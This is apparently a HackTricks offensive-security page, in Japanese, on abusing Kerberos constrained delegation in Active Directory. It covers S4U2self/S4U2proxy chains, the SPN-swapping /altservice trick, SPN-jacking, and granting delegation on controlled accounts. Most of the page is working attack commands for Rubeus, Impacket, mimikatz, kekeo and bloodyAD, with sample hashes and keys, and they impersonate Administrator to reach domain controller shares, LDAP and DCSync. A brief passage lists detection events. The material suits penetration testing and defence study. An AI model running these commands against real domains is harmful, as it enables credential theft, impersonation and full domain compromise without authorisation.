# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

これを使うと、Domain adminは、コンピューターが任意のマシン上の任意の**サービス**に対して、**ユーザーまたはコンピューターになりすます**ことを**許可**できます。

- **Service for User to self (_S4U2self_):** **SPNを所有する**サービスアカウントは通常、任意のユーザーに代わって自身宛てのTGSを取得できます。そのアカウントに[userAccountControl](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)の[TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)（T2A4D）も設定されている場合、そのTGSは**forwardable**になります。これにより、protocol transitionを使ったclassic constrained delegationが実用的になります。
- **Service for User to Proxy(_S4U2proxy_):** **サービスアカウント**は、**msDS-AllowedToDelegateTo**に列挙されたSPNに対して、ユーザーに代わってTGSを取得できます。S4U2Proxyで使う証拠チケットは、委任元サービス宛ての**forwardable**チケットである必要があります。これは、被害者から取得した実際のクライアントからサービスへのチケットか、**S4U2Self + T2A4D**で生成したチケットのいずれかです。

**注**: ADでユーザーに「_Account is sensitive and cannot be delegated_」が設定されている場合、または**Protected Users**のメンバーである場合、通常、constrained delegationによる**なりすましはできません**。最新のドメインでは、委任が有効なアカウントを標的にする際、RC4のみを前提とせず、**AES**の情報を優先してください。

つまり、**サービスのハッシュを侵害**すれば、ユーザーに**なりすまし**、指定されたマシン上の任意の**サービス**に対して、そのユーザーに代わって**アクセス**を取得できます（**privesc**の可能性があります）。

さらに、**アクセスできるのは、ユーザーがなりすませるサービスだけではなく、あらゆるサービス**です。SPN（要求されたサービス名）は検証されないためです（チケット内のこの部分は暗号化も署名もされていません）。そのため、**CIFS service**にアクセスできれば、たとえばRubeusの`/altservice`フラグを使って**HOST service**にもアクセスできます。同じSPN差し替えの弱点は、**Impacket getST -altservice**などのツールでも悪用されます。

また、**DCSync**を悪用するには、DC上の**LDAP serviceへのアクセス**が必要です。

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**オペレーター向け注記:** **gMSA/sMSA** のレビューでは、**ADUC** や BloodHound のスクリーンショットだけを信用しないでください。これらのアカウントでは通常の Delegation タブが表示されないことが多いため、**`userAccountControl`** と **`msDS-AllowedToDelegateTo`** の属性を直接列挙してください。

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-transition と Kerberos-only の constrained delegation

侵害したアカウントが **T2A4D** を持つ場合、通常はサービスキー/TGTのみで **`S4U2Self -> S4U2Proxy`** の完全なチェーンを実行できます。<sup>[[2]](#references)</sup>

**`msDS-AllowedToDelegateTo`**（従来の **「Use Kerberos only」** モード）しか持たない場合でも、delegation を悪用できることがありますが、S4U2Proxy の evidence ticket は、delegating service 宛ての **forwardable user-to-service ticket** である必要があります。方法の1つは、被害者の TGS を **LSASS/ccache** から取得し、第2段階に渡すことです（Rubeus の `/tgs:`）。**non-forwardable** な S4U2Self ticket は、従来の constrained delegation では不十分です。それしか evidence ticket がない場合は、代わりに [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) を確認してください。<sup>[[2]](#references)</sup>

条件次第では、最初に delegating service への [RBCD](resource-based-constrained-delegation.md) hop を行う方法もあります。対象ユーザーとサービス向けの **forwardable** ticket が生成された場合、その ticket を、後続の Kerberos-only S4U2Proxy hop の evidence として試すことができます。最初の ticket の flags、delegating service の SPN、対象の allow-list、およびユーザーの delegation 制限を確認してください。RBCD 属性を制御できるだけでは、2番目の hop が成立するとは限りません。

### ドメイン間 constrained delegation に関する注意点（2025+）

**Windows Server 2012/2012 R2** 以降、KDC は S4U2Proxy の拡張を通じて、ドメイン/フォレストをまたぐ **constrained delegation** をサポートしています。最新のビルド（Windows Server 2016–2025）でもこの動作は維持され、protocol transition を示す2つの PAC SID が追加されています。<sup>[[1]](#references)</sup>

- ユーザーが通常どおり認証した場合は `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**)。
- サービスが protocol transition を通じて ID を主張した場合は `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**)。

ドメイン間で protocol transition が使われた場合、PAC 内に `SERVICE_ASSERTED_IDENTITY` が含まれることを確認してください。これは S4U2Proxy のステップが成功したことを示します。<sup>[[1]](#references)</sup>

### Impacket / Linux ツール（altservice と full S4U）

最近の Impacket（0.11.x+）では、Rubeus と同じ S4U chain と SPN swapping が利用できます。<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

ユーザーの ST を先に偽造する場合（例: オフラインで hash のみを使う場合）は、**ticketer.py** と **getST.py** を組み合わせて S4U2Proxy を実行します。すでに有効な ccache があり、同じホストの service class を入れ替えるだけなら、**tgssub.py** も便利です。現在の既知の問題（偽造した ST が SPN key と一致しない場合の KRB_AP_ERR_MODIFIED）については、Impacket の issue #1713 を参照してください。<sup>[[2]](#references)</sup>

### SPN-jacking: constrained delegation のターゲットをリダイレクトする

従来の constrained delegation が許可するのは、`msDS-AllowedToDelegateTo` に指定された**SPN 文字列**であり、変更不可能なターゲット SID ではありません。S4U2Proxy 中に KDC は、その SPN を現在所有しているアカウントを解決し、そのアカウントの長期 key で service ticket を暗号化します。そのため、委任アカウントを制御し、別のサービスまたはコンピューターアカウントに対する `WriteSPN` を持っていれば、`SeEnableDelegationPrivilege` がなくても、変更されていない委任制約の転送先を変更できます。<sup>[[5]](#references)[[6]](#references)</sup>

次の 2 つの手法があります。<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** 元の所有者が削除、名前変更、または SPN の削除を行ったために、許可された SPN の所有者がいなくなっている状態です。目的のターゲットアカウントに直接追加します。
- **Live SPN-jacking:** SPN が引き続き元のアカウントに属している状態です。重複 SPN の検証によって通常は転送先への書き込みがブロックされるため、両方のオブジェクトに対する `WriteSPN` が必要です。元のアカウントから削除し、ターゲットに追加して ticket を取得した後、元の登録を復元します。

以下の抽象化された Linux の手順では、許可された SPN を移動し、侵害した委任プリンシパルとして S4U を実行してから、ticket のサービス名を新しいターゲット上の利用可能なサービスに書き換えます。<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice`は2つ目の独立したプリミティブです。S4U2Proxyチケットは、現在`$DELEGATED_SPN`を所有しているアカウント向けに暗号化されています。チケットサービス名（`sname`）は暗号化されたチケット本体の外部にあるため、ツールを使って、同じアカウントキーを使用する別のサービスクラス／ホスト名に差し替えられます。SPN-jackingは、まずチケットを保護する**アカウントキー**を変更し、サービスクラスの差し替えは、そのチケットを**どこに提示するか**を変更します。<sup>[[5]](#references)[[6]](#references)</sup>

稼働中の環境でjackingを行う場合は、正規のサービスを停止させないよう、チケット取得直後に2つのLDAP書き込みを逆順に行ってください。コンピューターアカウントの監査が有効なDCでは、あるコンピューターから`servicePrincipalName`が削除され、直後に別のコンピューターへ追加されたSecurityイベント**4742**を探します。特に、SPNのホスト名が移行先の`dNSHostName`と異なる場合に注目してください。イベント**4769**と相関させます。S4U2Selfではクライアントとサービスに同じアカウントが指定され、S4U2Proxyでは**Transited Services**が設定されます。<sup>[[5]](#references)</sup>

### 管理下のアカウントでの委任設定

この方法には、コンピューターまたはサービスアカウントの委任属性への**実効的な書き込みアクセス権**（たとえば、`GenericAll`、またはACL変更後の`WriteDACL`）**と**、LDAP変更を行うアカウントのユーザー権利`SeEnableDelegationPrivilege`が必要です。`msDS-AllowedToDelegateTo`の変更にはこの権限が必要であり、オブジェクト制御権限だけでは回避できないとMicrosoftは定めています。**bloodyAD**などのLDAPクライアントでprotocol-transition delegationを設定する前に、両方の前提条件を確認してください。<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

既存のコンピューターアカウントは、`ms-DS-MachineAccountQuota` がゼロでも候補になり得ます。このクォータが制限するのは、既定の新規コンピューター作成ルートであり、既存オブジェクトに対する権限ではありません。設定された委任を利用するには、委任元アカウントの鍵またはパスワードを制御できること、有効なサービスプリンシパル名、そして資格情報を委任できる対象ユーザーも必要です。これらの条件と、実効的なディレクトリアクセスは個別に確認する必要があります。

- Step 1: **許可されたサービスのTGTを取得する**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> コンピューター上でSYSTEM権限を取得しなくても、TGT ticket、RC4、またはAES256を入手する方法はほかにもあります。たとえば、Printer Bugやunconstrain delegation、NTLM relaying、Active Directory Certificate Service abuseなどです。
>
> **TGT ticket（またはそのハッシュ）さえあれば、コンピューター全体を侵害せずにこの攻撃を実行できます。**

- Step2: **ユーザーになりすましてサービス用のTGSを取得する**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**ired.teamの詳細情報。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberosの制約付き委任の概要 (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacketを使った委任の悪用 (パート2): 制約付き委任 (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberosの制約付き委任 (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosityがドメインを滅ぼした: Offensive Kerberosの概要 (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: WriteSPN Abuseにおける例外的なケース](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
